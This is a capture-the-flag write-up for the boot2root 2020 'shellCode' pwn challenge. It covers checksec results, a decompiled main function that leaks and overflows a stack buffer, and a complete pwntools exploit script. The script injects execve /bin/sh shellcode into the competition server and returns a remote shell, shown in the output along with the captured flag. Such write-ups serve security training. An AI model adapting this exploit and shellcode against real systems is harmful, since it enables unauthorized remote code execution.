# boot2root 2020

## shellCode

> 477
>
> babies love shell legends love shellcode
>
> `nc 35.238.225.156 1006`
>
> Author: TheBadGuy
> 
> [shellcode](shellcode)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _shellcode_


## Summary

Shellcode in a tight spot.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

No canary, has RWX segments, NX disabled screams shellcode.  Why bother with PIE?


### Decompile with Ghidra

```c
undefined8 main(void)
{
  undefined8 local_18;
  undefined8 local_10;
  
  local_18 = 0;
  local_10 = 0;
  setvbuf(stdout,(char *)0x0,1,0);
  puts("Amigo\'s I welcome you to the boot2root server");
  printf("Wait did I say something I wasnt supposed to[%p] ?\n",&local_18);
  puts("Okay Waiting for the answer now");
  read(0,&local_18,0x40);
  return 0;
}
```

`main` leaks the address of buffer `local_18` that is `0x18` (24) bytes from the return address, then `read`s up to `0x40` (64) bytes that allows `local_18` to overflow the return address and then some.

If you can find or create shellcode in 24 bytes that also will not get messed up with pop/push from the stack (happens), then go for it.  Otherwise, there's the roomier 32 bytes (64(`read`) - 24(`local_18`) - 8(return address)) after the return address that is also less likely to get clobbered with pop/push.

I went with the roomer option.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./shellcode')

if args.REMOTE:
    p = remote('35.238.225.156', 1006)
else:
    p = process(binary.path)

p.recvuntil('supposed to[')
_ = p.recvuntil(']')
buff = int(_[:-1],16)
log.info('buff: ' + hex(buff))

# http://shell-storm.org/shellcode/files/shellcode-905.php
# 29 bytes
shellcode  = b''
shellcode += b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf'
shellcode += b'\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54'
shellcode += b'\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

payload  = b''
payload += 0x18 * b'A'
payload += p64(buff + 0x18 + 8)
payload += shellcode

p.sendafter('answer now\n',payload)
p.interactive()
```

First, capture the buffer leak (address of `local_18`).

Next, find (or create) some shellcode < 32 bytes--easy.

For the payload just write out `0x18` bytes to get to the return address in the stack (`local_18` is `0x18` (24) bytes from the return address), then change the return address to the address below it (`buff + 0x18` gets you to return address, add `8` for the next stack line), then, our shellcode.

On "return", the stack pointer will bump down to our shellcode and give us a shell.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/boot2root2020/shellcode/shellcode'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 35.238.225.156 on port 1006: Done
[*] buff: 0x7fff7cc19470
[*] Switching to interactive mode
$ id
sh: 1: id: not found
$ ls -l
total 44
drwxr-x--- 1 0 1000  4096 Dec  6 14:16 bin
drwxr-x--- 1 0 1000  4096 Dec  6 14:16 dev
-rwxr----- 1 0 1000    23 Dec  6 15:31 flag
drwxr-x--- 1 0 1000  4096 Dec  6 14:16 lib
drwxr-x--- 1 0 1000  4096 Dec  6 14:16 lib32
drwxr-x--- 1 0 1000  4096 Dec  6 14:16 lib64
-rwxr-x--- 1 0 1000 16800 Dec  6 15:31 shellcode
$ cat flag
b00t2root{sehllz_c0de}
```
